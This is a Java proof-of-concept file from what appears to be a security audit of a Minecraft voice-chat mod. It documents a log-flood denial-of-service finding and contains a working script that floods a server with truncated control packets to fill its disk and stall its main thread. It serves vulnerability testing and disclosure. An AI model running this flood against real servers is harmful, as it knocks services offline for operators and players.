package com.enn3developer.gtnhvoice.security;

/**
 * Finding: an authenticated client can flood the server's log (and block the main server thread) by
 * sending MALFORMED control-channel packets whose SimpleNetworkWrapper discriminator is registered
 * CLIENT-side (ServerHello=1, ServerReject=2, RosterSnapshot=3, RosterUpdate=4, GroupUpdate=5).
 *
 * <p>FML's {@code FMLIndexedMessageToMessageCodec} is a single shared codec for the whole {@code
 * gtnhvoice} channel: it decodes EVERY registered discriminator regardless of which physical side the
 * handler was registered for, so the SERVER runs the clientbound packet's {@code fromBytes} during the
 * decode step - and this decode happens on the MAIN SERVER THREAD (the FML channel is pumped from
 * {@code NetworkManager.processReceivedPackets} during the server tick). A truncated body makes {@code
 * fromBytes} throw (e.g. {@code ServerHelloPacket.fromBytes -> HelloCodec.decodeServerHello} throws
 * {@code EOFException}). FML does NOT swallow that: it logs the failure THREE times, each a full
 * multi-line stack trace - "FMLIndexedMessageCodec exception caught", "SimpleChannelHandlerWrapper
 * exception", and "There was a critical exception handling a packet on channel gtnhvoice".
 *
 * <p>Crucially there is NO rate limiter anywhere on this path. The {@code HelloRateLimiter} (the
 * finding-#9 fix) and the per-hello entry-log fix (finding #2) both live INSIDE the disc-0
 * ClientHello handler ({@code VoiceServerManager.handleClientHello} / {@code
 * ClientHelloServerHandler}). Discriminators 1..5 never reach any gtnhvoice code - they fail in the
 * shared FML codec, upstream of every gate - so a flood costs three full stack traces per packet,
 * unthrottled, on the server thread. That is disk-exhaustion + tick-starvation DoS from a single
 * joined player.
 *
 * <p>Weapon: a 1-byte disc-1 body ({@code [protocolVersion]} only). {@code decodeServerHello} reads the
 * version byte, then {@code readLong} for the sessionId underflows -> EOFException -> 3 stack traces.
 *
 * <p>Observed against runServer25: one authenticated connection is allowed ~1001 such malformed decodes
 * before the server disconnects it, and those 1001 packets produced 114,138 log lines / 13,491,463 bytes
 * (~12.87 MiB) of full stack traces, ALL tagged {@code [Server thread]}, in ~1-2 seconds. The disconnect
 * is a per-connection ceiling only: Mallory reconnects (login + FML handshake, unthrottled - every
 * back-to-back reconnect in testing succeeded) and repeats, so the log grows ~12.87 MiB per reconnect
 * cycle while the main server thread is pinned logging stack traces each burst. Three independent
 * connections each produced exactly 1001 -> the counter is per-connection and resets on reconnect.
 *
 * <p>Evidence: snapshot {@code run/server/logs/fml-server-latest.log} line count + size before/after.
 */
public final class ControlDecodeFlood {

    // Clientbound discriminator with NO server handler and NO possible rate limiter: the decode
    // exception is the entire server-side effect.
    private static final int DISC_SERVER_HELLO = 1;

    public static void main(String[] args) throws Exception {
        String host = args.length > 0 ? args[0] : "127.0.0.1";
        int port = args.length > 1 ? Integer.parseInt(args[1]) : 25565;
        // How long to KEEP the connection open and keep feeding malformed packets. The server thread is
        // throughput-limited (it logs 3 synchronous stack traces per packet), so this - not a packet
        // count - is what bounds the damage: the log grows for as long as the socket stays open.
        long holdSeconds = args.length > 2 ? Long.parseLong(args[2]) : 10;
        String username = args.length > 3 ? args[3] : "mallory";

        // Truncated ServerHello body: just the protocolVersion byte. decodeServerHello reads it, then
        // readFully/readLong underflows on the next field -> EOFException, escaping as UncheckedIOException.
        byte[] truncatedBody = new byte[] { 0x04 };

        try (VoiceSession s = EvilClient.connect(host, port)
            .username(username)
            .establish()) {

            System.out.println("[decode-flood] session up (sessionId=" + s.getSessionId()
                + "); feeding truncated disc-" + DISC_SERVER_HELLO + " (ServerHello) packets for "
                + holdSeconds + "s on the gtnhvoice control channel");

            long start = System.nanoTime();
            long deadline = start + holdSeconds * 1_000_000_000L;
            long sent = 0;
            // Feed continuously but keep the queue from growing without bound client-side: send in small
            // bursts and yield, so the server's inbound queue stays fed while we hold the socket open.
            while (System.nanoTime() < deadline) {
                for (int i = 0; i < 500; i++) {
                    s.sendControl(DISC_SERVER_HELLO, truncatedBody);
                    sent++;
                }
                Thread.sleep(10);
            }
            double secs = (System.nanoTime() - start) / 1e9;
            System.out.printf(
                "[decode-flood] DONE: fed %d malformed disc-1 packets over %.2fs. "
                    + "Each DECODED packet = 3 full stack traces on the server thread (no rate limiter on this path).%n",
                sent, secs);

            // Give the server thread a moment more to flush before we close (closing discards the queue).
            Thread.sleep(2000);
        }
    }

    private ControlDecodeFlood() {}
}
